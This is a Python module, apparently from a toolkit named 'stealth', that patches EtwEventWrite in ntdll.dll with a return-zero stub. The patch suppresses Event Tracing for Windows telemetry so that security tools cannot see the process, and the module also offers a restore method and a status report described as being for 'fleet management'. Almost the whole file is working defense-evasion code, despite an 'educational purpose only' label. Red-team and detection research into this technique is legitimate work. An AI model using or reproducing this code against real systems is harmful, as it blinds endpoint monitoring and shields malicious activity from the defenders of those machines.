"""
ETW Evasion — disable Event Tracing for Windows in the current process.

Patches ``EtwEventWrite`` in ``ntdll.dll`` to return ``STATUS_SUCCESS``
(0) immediately, preventing security tools from receiving ETW telemetry
events generated by this process. The patch is a minimal ``xor eax, eax;
ret`` stub that replaces the first bytes of the function.

The original bytes are saved so the patch can be reversed with
:meth:`ETWEvasion.restore`.

Windows-only.  EDUCATIONAL PURPOSE ONLY.

Usage::

    from stealth.etw_evasion import ETWEvasion

    evasion = ETWEvasion()
    evasion.patch()     # ETW silenced
    # ... do work ...
    evasion.restore()   # ETW restored
"""
from __future__ import annotations

import ctypes
import logging
import platform
from typing import Any

logger = logging.getLogger(__name__)

# ── Platform guard ────────────────────────────────────────────────────

_IS_WINDOWS = platform.system().lower() == "windows"

# ── Windows constants ─────────────────────────────────────────────────

PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20

# ── x86-64 stub: ``xor eax, eax ; ret`` ─────────────────────────────
#   31 C0    xor eax, eax   (set return value to 0 = STATUS_SUCCESS)
#   C3       ret            (return immediately)
_RET0_STUB_X64 = b"\x31\xC0\xC3"

# ── x86 (WoW64) stub: ``xor eax, eax ; ret 0x14`` ──────────────────
#   EtwEventWrite on 32-bit uses stdcall with 5 args (0x14 bytes).
#   31 C0       xor eax, eax
#   C2 14 00    ret 0x14
_RET0_STUB_X86 = b"\x31\xC0\xC2\x14\x00"


class ETWEvasion:
    """Patch ``EtwEventWrite`` in ntdll to suppress ETW telemetry.

    Attributes
    ----------
    _patched : bool
        Whether the patch is currently active.
    _original_bytes : bytes
        The original function prologue, saved for :meth:`restore`.
    _func_address : int
        Virtual address of ``EtwEventWrite`` in the process.
    """

    def __init__(self) -> None:
        self._patched: bool = False
        self._original_bytes: bytes = b""
        self._func_address: int = 0
        self._stub: bytes = b""

    # ── Public API ───────────────────────────────────────────────────

    def patch(self) -> bool:
        """Patch ``EtwEventWrite`` to silently return ``STATUS_SUCCESS``.

        Returns
        -------
        bool
            ``True`` if the patch was applied (or was already active).
        """
        if self._patched:
            logger.debug("ETW evasion already active")
            return True

        if not _IS_WINDOWS:
            logger.info("ETW evasion skipped (not Windows)")
            return False

        try:
            return self._apply_patch()
        except Exception as exc:
            logger.error("ETW evasion patch failed: %s", exc, exc_info=True)
            return False

    def restore(self) -> bool:
        """Restore the original ``EtwEventWrite`` bytes.

        Returns
        -------
        bool
            ``True`` if the original bytes were successfully written back.
        """
        if not self._patched:
            logger.debug("ETW evasion not active; nothing to restore")
            return True

        if not _IS_WINDOWS:
            return False

        try:
            return self._restore_original()
        except Exception as exc:
            logger.error("ETW evasion restore failed: %s", exc, exc_info=True)
            return False

    @property
    def is_patched(self) -> bool:
        """Whether the ETW patch is currently applied."""
        return self._patched

    def get_status(self) -> dict[str, Any]:
        """Return module status for dashboards / fleet management."""
        return {
            "available": _IS_WINDOWS,
            "patched": self._patched,
            "func_address": hex(self._func_address) if self._func_address else None,
        }

    # ── Internal implementation ──────────────────────────────────────

    def _apply_patch(self) -> bool:
        """Core patching logic (Windows only)."""
        kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]

        # ── Step 1: Locate EtwEventWrite in ntdll.dll ────────────
        ntdll_handle = kernel32.GetModuleHandleW("ntdll.dll")
        if not ntdll_handle:
            logger.error("Failed to get ntdll.dll module handle")
            return False

        func_addr = kernel32.GetProcAddress(ntdll_handle, b"EtwEventWrite")
        if not func_addr:
            logger.error("Failed to locate EtwEventWrite in ntdll.dll")
            return False

        self._func_address = func_addr

        # Choose stub based on architecture
        import struct as _struct
        is_64bit = _struct.calcsize("P") == 8
        self._stub = _RET0_STUB_X64 if is_64bit else _RET0_STUB_X86
        patch_size = len(self._stub)

        # ── Step 2: Read original bytes ──────────────────────────
        original_buf = (ctypes.c_char * patch_size)()
        bytes_read = ctypes.c_size_t(0)

        # Use ReadProcessMemory on ourselves (HANDLE -1 = current process)
        current_process = ctypes.c_void_p(-1)
        success = kernel32.ReadProcessMemory(
            current_process,
            ctypes.c_void_p(func_addr),
            original_buf,
            patch_size,
            ctypes.byref(bytes_read),
        )
        if not success:
            # Fallback: direct ctypes memory read
            self._original_bytes = (ctypes.c_char * patch_size).from_address(func_addr).raw
        else:
            self._original_bytes = bytes(original_buf)

        logger.debug(
            "EtwEventWrite at 0x%x, original bytes: %s",
            func_addr, self._original_bytes.hex(),
        )

        # ── Step 3: Make page writable ───────────────────────────
        old_protect = ctypes.c_ulong(0)
        success = kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            patch_size,
            PAGE_EXECUTE_READWRITE,
            ctypes.byref(old_protect),
        )
        if not success:
            err = kernel32.GetLastError()
            logger.error("VirtualProtect (RWX) failed, error %d", err)
            return False

        # ── Step 4: Write the ret-0 stub ─────────────────────────
        patch_buf = (ctypes.c_char * patch_size)(*self._stub)
        bytes_written = ctypes.c_size_t(0)

        success = kernel32.WriteProcessMemory(
            current_process,
            ctypes.c_void_p(func_addr),
            patch_buf,
            patch_size,
            ctypes.byref(bytes_written),
        )
        if not success:
            # Fallback: direct memory write via ctypes memmove
            ctypes.memmove(func_addr, self._stub, patch_size)

        # ── Step 5: Restore original page protection ─────────────
        _discard = ctypes.c_ulong(0)
        kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            patch_size,
            old_protect.value,
            ctypes.byref(_discard),
        )

        self._patched = True
        logger.info(
            "ETW evasion active — EtwEventWrite patched at 0x%x (%d bytes)",
            func_addr, patch_size,
        )
        return True

    def _restore_original(self) -> bool:
        """Restore the original EtwEventWrite bytes (Windows only)."""
        if not self._original_bytes or not self._func_address:
            logger.warning("No original bytes saved; cannot restore ETW")
            return False

        kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
        patch_size = len(self._original_bytes)

        # Make writable
        old_protect = ctypes.c_ulong(0)
        success = kernel32.VirtualProtect(
            ctypes.c_void_p(self._func_address),
            patch_size,
            PAGE_EXECUTE_READWRITE,
            ctypes.byref(old_protect),
        )
        if not success:
            logger.error("VirtualProtect (RWX) failed during restore")
            return False

        # Write original bytes back
        original_buf = (ctypes.c_char * patch_size)(*self._original_bytes)
        bytes_written = ctypes.c_size_t(0)
        current_process = ctypes.c_void_p(-1)

        success = kernel32.WriteProcessMemory(
            current_process,
            ctypes.c_void_p(self._func_address),
            original_buf,
            patch_size,
            ctypes.byref(bytes_written),
        )
        if not success:
            ctypes.memmove(self._func_address, self._original_bytes, patch_size)

        # Restore page protection
        _discard = ctypes.c_ulong(0)
        kernel32.VirtualProtect(
            ctypes.c_void_p(self._func_address),
            patch_size,
            old_protect.value,
            ctypes.byref(_discard),
        )

        self._patched = False
        logger.info(
            "ETW evasion restored — EtwEventWrite at 0x%x unpatched",
            self._func_address,
        )
        return True

    # ── Dunder ───────────────────────────────────────────────────────

    def __repr__(self) -> str:
        state = "patched" if self._patched else "inactive"
        return f"<ETWEvasion ({state}, windows={_IS_WINDOWS})>"

    def __del__(self) -> None:
        """Attempt to restore on garbage collection."""
        if self._patched:
            try:
                self.restore()
            except Exception:
                pass
